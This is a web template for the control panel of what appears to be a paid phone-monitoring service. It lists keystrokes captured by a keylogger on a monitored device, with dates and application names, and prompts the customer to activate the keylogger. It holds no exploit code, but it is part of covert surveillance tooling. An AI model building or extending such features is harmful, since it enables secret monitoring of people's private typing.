<div>
    <h1 class="text-center">{$title}</h1>

    {if !$paid}
        {insert "cp/updatePackage.html"}
    {elseif $hasRecords}
    
    {if isset($serviceKeylogger) && !$serviceKeylogger && $hasRecords && $di.currentDevice.os != 'ios'}
        
    {insert "inc.cp.messages.htm"}

    <div class="alert alert-warning" role="alert">
        <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">Ã—</span><span class="sr-only">Close</span></button>
        <p style="color:#303030;">Keylogger is currently disabled.
    If you want to view updated information, you need to <a href="{$di.router->getRouteUrl('content', ['uri' => 'instructions/keylogger-activation.html?activate=1'])}" style="color: #16a89e;font-weight: normal;">activate Keylogger</a>.</p>
    </div>

        
    {/if}
    
    <div class="daterangepickerWrapper">
        <div id="reportrange" class="btn btn-default pull-right">
            <i class="fa fa-calendar fa-lg"></i>
            <span></span>
            <b class="caret"></b>
        </div>
    </div>

    <div class="table-container">
        <table class="dataTable" id="datatables" aria-describedby="datatables_info">
            <thead>
                <tr role="row">
                    <th>{$di.t->_('Date')}</th>
                    <th>{$di.t->_('Application name')}</th>
                    <th>{$di.t->_('Logger text')}</th>
                </tr>
            </thead>
        </table>
    </div>
    <script type="text/javascript">
        $(document).ready(function() {
            var keylogger = {
                startDate: -1,
                endDate: -1,
                table: null,
                getRangeUrl: function(start, end) {
                    if (start === null && end === null) {
                        this.startDate = this.endDate = -1;
                    } else if (start && end) {
                        this.startDate = moment(start).unix();
                        this.endDate = moment(end).unix();
                    }
                    
                    return '{$di.config.domain}/cp/keylogger?' + $.param({
                        timeFrom: this.startDate,
                        timeTo: this.endDate
                    });
                },
                init: function() {
                    var table = $('.dataTable').dataTable({
                        bProcessing: true,
                        bServerSide: true,
                        sAjaxSource: this.getRangeUrl(),
                        bPaginate: true,
                        bFilter: true,
                        bSort: true,
                        bInfo: true,
                        bAutoWidth: false,
                        bSortMulti: false,
                        iDisplayLength: {$authData.records_per_page},
                        aaSorting: [[0, 'desc']],
                        oLanguage: {
                            sUrl: "{$di.config.staticDomain}/datatables/language/{$di.t->getLocale()}.txt"
                        },
                        aoColumns: [{
                                fnRender: function(obj, value) {
                                    return moment(value * 1000).zone(0).format('lll');
                                }
                            },
                            {
                                mRender: function(value) {
                                    return escapeAndTruncate(value);
                                }
                            },
                            {
                                bSortable: false,
                                mRender: function(value) {
                                    return escapeAndTruncate(value);
                                }
                            }
                        ],
                        fnDrawCallback: function() {
                            keylogger.table = table;
                            $(this).find('tbody').tableScroll();
                        }
                    });

                    this.initRangePicker();
                },
                reloadTable: function(url) {
                    if (this.table) {
                        this.table.fnReloadAjax(url);
                    }
                },
                initRangePicker: function() {
                    $('#reportrange').timeRange(function(from, to) {
                        keylogger.reloadTable(keylogger.getRangeUrl(from, to));
                    });
                }
            };

            keylogger.init();
        });
    </script>
    {else}
        {include "content/{$di.t->getLocale()}/noDataTitle.html"
            moduleName = $di.t->_('Keylogger')
        }
        {include "content/{$di.t->getLocale()}/noData.html"}
    {/if}
</div>
